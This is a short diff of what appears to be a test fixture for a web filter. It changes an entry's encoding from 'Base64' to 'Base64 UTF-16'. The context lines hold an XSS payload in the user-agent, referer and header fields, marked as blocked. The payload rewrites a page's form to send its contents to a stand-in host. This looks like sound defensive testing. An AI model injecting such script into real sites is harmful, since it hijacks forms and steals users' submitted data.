@@ -8,7 +8,7 @@
       "USER-AGENT": "<script>x=document.querySelector('form');x.setAttribute('method','GET');x.setAttribute('action','http://example.com/');</script>",
       "REFERER": "<script>x=document.querySelector('form');x.setAttribute('method','GET');x.setAttribute('action','http://example.com/');</script>",
       "HEADER": "<script>x=document.querySelector('form');x.setAttribute('method','GET');x.setAttribute('action','http://example.com/');</script>",
-      "ENCODE": "Base64",
+      "ENCODE": "Base64 UTF-16",
       "BLOCKED": true
     }
   ]
